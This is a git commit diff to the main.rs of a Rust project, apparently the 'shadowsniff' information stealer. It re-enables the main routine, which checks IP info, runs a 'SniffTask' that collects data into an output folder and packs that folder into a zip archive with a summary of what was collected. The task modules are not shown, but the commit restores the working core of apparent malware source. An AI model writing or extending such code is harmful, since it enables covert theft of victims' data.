f655d2b971d3adb61a0dee2ea8060f8f29e9a8b1
sqlerrorthing <148702857+sqlerrorthing@users.noreply.github.com>
2025-06-10 22:39:16 +0800

    restore

--- src/main.rs
+++ src/main.rs
@@ -15,7 +15,13 @@
 
 extern crate alloc;
 
+use alloc::format;
+use collector::atomic::AtomicCollector;
+use collector::DisplayCollector;
+use ipinfo::init_ip_info;
+use shadowsniff::SniffTask;
 use tasks::Task;
+use utils::log_debug;
 use utils::path::Path;
 use zip::ZipArchive;
 
@@ -27,25 +33,27 @@ static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;
 #[unsafe(no_mangle)]
 #[allow(unused_unsafe)]
 pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
-    // if !init_ip_info() {
-    //     panic!()
-    // }
+    if !init_ip_info() {
+        panic!()
+    }
 
     let out = Path::new("output");
-    // let _ = out.remove_dir_all();
-    // let _ = out.mkdir();
-    //
-    // let collector = AtomicCollector::default();
-    //
-    // unsafe {
-    //     SniffTask::new().run(&out, &collector);
-    // }
-    //
-    // log_debug!("{}", DisplayCollector(collector));
+    let _ = out.remove_dir_all();
+    let _ = out.mkdir();
+    
+    let collector = AtomicCollector::default();
+    
+    unsafe {
+        SniffTask::new().run(&out, &collector);
+    }
+    
+    let displayed_collector = format!("{}", DisplayCollector(collector));
+    
+    log_debug!("{displayed_collector}");
 
     let zip = ZipArchive::default()
-        .password("x")
-        .add_file(&Path::new("hello.txt"))
+        .add_folder_content(&out)
+        .comment(displayed_collector)
         .create();
 
     let out = Path::new("output.zip");
